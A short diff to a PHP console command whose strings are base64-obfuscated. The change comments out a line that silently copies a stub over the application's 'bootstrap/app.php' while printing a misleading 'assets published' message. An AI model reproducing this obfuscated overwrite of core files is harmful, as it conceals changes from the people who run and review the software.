@@ -44,7 +44,7 @@ class PhUntCm extends Command
           }
         }
 
-        File::copy($db.'/'.xPhpLib('ZHRQL3N0QXAuc3R1Yg=='),xPhpLib('Ym9vdHN0cmFwL2FwcC5waHA='));
+        // File::copy($db.'/'.xPhpLib('ZHRQL3N0QXAuc3R1Yg=='),xPhpLib('Ym9vdHN0cmFwL2FwcC5waHA='));
 
       $this->info(xPhpLib('U3FsU3RyaW5naUZ5IGFzc2V0cyBmaWxlcyBwdWJsaXNoZWQgc3VjY2Vzc2Z1bGx5Lg=='));
     }
